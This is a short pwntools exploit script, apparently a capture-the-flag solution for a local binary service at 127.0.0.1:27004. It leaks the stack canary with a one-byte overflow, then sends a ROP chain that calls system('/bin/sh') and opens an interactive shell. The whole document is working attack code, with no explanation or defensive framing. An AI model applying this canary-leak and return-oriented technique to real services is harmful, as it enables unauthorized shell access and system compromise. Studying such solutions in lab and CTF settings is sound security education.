from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27004)

binsh_addr = 0x404058
pop_rdi_ret_addr = 0x4011de
call_system_addr = 0x401284

payload = b"a" * 41
p.send(payload)
p.recvuntil(b"a" * 40)
canary = u64(p.recv(8)) - 0x61
log.success(f"leak canary: {hex(canary)}")

payload = b"a" * 40 + p64(canary) + b"b" * 8 + \
    p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(call_system_addr)
p.send(payload)

p.interactive()
